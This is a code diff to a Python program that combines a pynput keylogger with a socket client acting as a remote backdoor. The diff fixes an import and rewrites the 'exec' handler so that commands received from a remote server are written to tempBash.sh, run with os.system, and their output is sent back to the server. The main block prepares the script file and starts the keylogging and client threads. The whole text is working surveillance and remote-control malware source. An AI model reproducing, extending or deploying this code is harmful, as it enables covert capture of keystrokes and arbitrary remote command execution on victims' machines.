@@ -1,6 +1,6 @@
-ffrom pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener
 import socket, subprocess, threading, pyautogui, datetime
-import sendss, time
+import sendss, time, os
 
 def start_keylogging():
     def on_press(key):
@@ -27,8 +27,10 @@ def start_client():
             break
         c = data.decode().split()
         if c[0] == "exec":
-            process = subprocess.Popen(c[1:], stdout = subprocess.PIPE)
-            output, error = process.communicate()
+            binp = " ".join(c[1:])
+            open("tempBash.sh", "w").write(binp + " > bashOutput")
+            os.system("./tempBash.sh")
+            output = open("bashOutput", "rb").read()
             if output:
                 s.send(output)
             else:
@@ -53,6 +55,11 @@ def start_client():
         print(c)
 
 if __name__ == "__main__":
+
+    open("tempBash.sh", "w")
+    open("bashOutput", "w")
+    os.system("chmod +x tempBash.sh")
+
     t1 = threading.Thread(target = start_keylogging)
     t2 = threading.Thread(target = start_client)
 
